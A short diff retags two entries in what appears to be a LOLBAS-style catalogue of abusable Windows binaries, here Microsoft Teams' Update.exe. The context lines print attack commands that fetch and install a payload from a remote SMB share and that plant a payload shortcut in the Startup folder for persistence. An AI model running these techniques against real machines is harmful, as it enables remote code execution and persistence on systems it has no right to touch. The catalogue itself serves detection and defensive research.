@@ -79,7 +79,7 @@ Commands:
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
     Tags:
-      - Execute: Nuget
+      - Execute: CMD
       - Execute: Remote
   - Command: Update.exe --updateRollback=\\remoteserver\payloadFolder
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
@@ -109,7 +109,7 @@ Commands:
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
     Tags:
-      - Execute: EXE
+      - Execute: CMD
   - Command: Update.exe --createShortcut=payload.exe -l=Startup
     Description: Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the command. Update.exe will create a payload.exe shortcut in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will run on every login of the user who runs it.
     Usecase: Execute binary
